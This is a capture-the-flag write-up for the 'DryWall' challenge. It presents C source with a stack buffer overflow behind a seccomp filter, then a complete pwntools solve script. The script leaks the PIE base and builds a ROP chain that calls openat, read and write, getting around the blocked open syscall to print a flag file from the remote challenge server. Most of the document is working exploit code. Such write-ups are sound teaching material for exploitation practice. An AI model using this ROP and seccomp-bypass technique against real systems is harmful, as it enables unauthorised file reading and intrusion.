# DryWall

The challenge provides a binary with a buffer overflow and seccomp restrictions:

```cpp
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>

typedef void * scmp_filter_ctx;

static char name[30];

void gift(){
    asm ("pop %rdx; ret;");
    asm ("pop %rax; ret;");
    asm ("syscall; ret;");
}

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); 

    
    
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(readv),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(writev),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_readv),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_writev),0);


    seccomp_load(ctx);
    
    char buf[256];
    puts("What is your name, epic H4x0r?");
    fgets(name, 30, stdin);

    printf("Good luck %s <|;)\n", name);
    printf("%p\n",main);
    fgets(buf, 0x256, stdin);

    return 0;
}
```

The `buf` array (256 bytes) overflows at 264 bytes (including saved RBP). Seccomp blocks `open` but we can use `openat`.
The `main` address leaks, and `name` holds our input. 

Looking at the Dockerfile, we can see that the flag is stored at `/home/user/flag.txt:
```Dockerfile
COPY flag.txt /home/user/
```

Our idea is to store the filename in `name`, leak the PIE base with `main`, and overflow `buf` with a ROP chain using `gift()` gadgets to call `openat`, `read` and `write`.

## solve.py

```py
from pwn import *

# context.log_level = "debug"
context.binary = elf = ELF("./chal")

# r = process('./chal')
r = remote('drywall.kctf-453514-codelab.kctf.cloud', 1337)

r.recvuntil(b"What is your name, epic H4x0r?\n")
r.send(b"/home/user/flag.txt\0\n")

r.recvuntil(b" <|;)\n")
leak_line = r.recvline().strip()
leaked_main = int(leak_line, 16)

# Calculate the PIE base address and the address of the 'name' buffer
binary_base = leaked_main - elf.symbols['main']
name_addr = binary_base + 0x4050
log.success(f"PIE base: {hex(binary_base)}")
log.success(f"name buffer address: {hex(name_addr)}")

# Locate ROP gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + binary_base
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] + binary_base
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0] + binary_base
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] + binary_base
syscall = rop.find_gadget(['syscall', 'ret'])[0] + binary_base

# Build the ROP chain
payload = b"A" * 264

# openat(AT_FDCWD, "/home/user/flag.txt", 0)
payload += p64(pop_rdi) + p64(0xFFFFFFFFFFFFFF9C)  # rdi = AT_FDCWD (-100)
payload += p64(pop_rsi_r15) + p64(name_addr) + p64(0)  # rsi = name_addr, r15 = 0 (padding)
payload += p64(pop_rdx) + p64(0)                      # rdx = O_RDONLY (0)
payload += p64(pop_rax) + p64(257)                    # rax = 257 (openat syscall number)
payload += p64(syscall)                               # Call syscall

# read(fd, name_addr, 64)
payload += p64(pop_rdi) + p64(3)                      # rdi = 3 (file descriptor from openat)
payload += p64(pop_rsi_r15) + p64(name_addr) + p64(0)  # rsi = name_addr, r15 = 0
payload += p64(pop_rdx) + p64(64)                     # rdx = 64 (bytes to read)
payload += p64(pop_rax) + p64(0)                      # rax = 0 (read syscall number)
payload += p64(syscall)                               # Call syscall

# write(1, name_addr, 64)
payload += p64(pop_rdi) + p64(1)                      # rdi = 1 (stdout)
payload += p64(pop_rsi_r15) + p64(name_addr) + p64(0)  # rsi = name_addr, r15 = 0
payload += p64(pop_rdx) + p64(64)                     # rdx = 64 (bytes to write)
payload += p64(pop_rax) + p64(1)                      # rax = 1 (write syscall number)
payload += p64(syscall)                               # Call syscall

# exit(0)
payload += p64(pop_rdi) + p64(0)                      # rdi = 0 (exit code)
payload += p64(pop_rax) + p64(60)                     # rax = 60 (exit syscall number)
payload += p64(syscall)                               # Call syscall

r.sendline(payload)
print(r.recvall().decode())
```
